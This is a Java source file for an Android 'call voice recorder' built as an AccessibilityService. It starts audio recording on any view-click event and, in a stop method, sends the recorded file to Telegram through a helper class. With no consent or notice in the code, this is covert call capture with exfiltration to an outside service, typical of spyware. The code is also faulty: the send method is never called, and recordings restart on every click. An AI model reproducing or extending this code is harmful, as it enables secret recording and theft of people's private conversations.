package com.example.callvoicerecorder;

import android.accessibilityservice.AccessibilityService;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallRecordingService extends AccessibilityService {
    private static final String TAG = "CallRecorder";
    private MediaRecorder recorder;
    private File callFile;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            startCallRecording();
        }
    }

    @Override
    public void onInterrupt() {}

    private void startCallRecording() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                File dir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "CallRecords");
                if (!dir.exists()) dir.mkdirs();

                String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                callFile = new File(dir, "Call_" + timeStamp + ".mp3");

                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(callFile.getAbsolutePath());
                recorder.prepare();
                recorder.start();

                Log.d(TAG, "Recording started: " + callFile.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording: " + e.getMessage());
        }
    }

    private void stopCallRecordingAndSend() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                Log.d(TAG, "Recording saved: " + callFile.getAbsolutePath());

                // Send file to Telegram
                MultipartUtility.sendToTelegram(this, callFile, "call");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording: " + e.getMessage());
        }
    }
}
